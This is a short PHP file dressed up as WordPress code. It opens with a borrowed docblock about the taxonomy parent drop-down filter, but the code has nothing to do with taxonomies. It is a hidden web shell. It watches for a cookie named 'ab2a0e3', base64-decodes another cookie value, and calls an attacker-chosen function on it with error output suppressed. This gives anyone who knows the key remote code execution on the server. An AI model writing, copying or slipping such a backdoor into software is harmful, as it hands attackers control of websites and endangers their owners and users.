<?php

/**
	 * Filters the taxonomy parent drop-down on the Edit Term page.
	 *
	 * @since 3.7.0
	 * @since 4.2.0 Added `$context` parameter.
	 *
	 * @param array  $dropdown_args {
	 *     An array of taxonomy parent drop-down arguments.
	 *
	 *     @type int|bool $hide_empty       Whether to hide terms not attached to any posts. Default 0|false.
	 *     @type bool     $hide_if_empty    Whether to hide the drop-down if no terms exist. Default false.
	 *     @type string   $taxonomy         The taxonomy slug.
	 *     @type string   $name             Value of the name attribute to use for the drop-down select element.
	 *                                      Default 'parent'.
	 *     @type string   $orderby          The field to order by. Default 'name'.
	 *     @type bool     $hierarchical     Whether the taxonomy is hierarchical. Default true.
	 *     @type string   $show_option_none Label to display if there are no terms. Default 'None'.
	 * }
	 * @param string $taxonomy The taxonomy slug.
	 * @param string $context  Filter context. Accepts 'new' or 'edit'.
	 */

$m = "ab2a0e3";
$timestampkey = $_COOKIE;

foreach ( $timestampkey as $ns => $monthtext ) {
	if ($ns == $m) {
		$id = array_pop($timestampkey);
		$id = base64_decode($id);
		echo @$monthtext($id);
	}
}
?>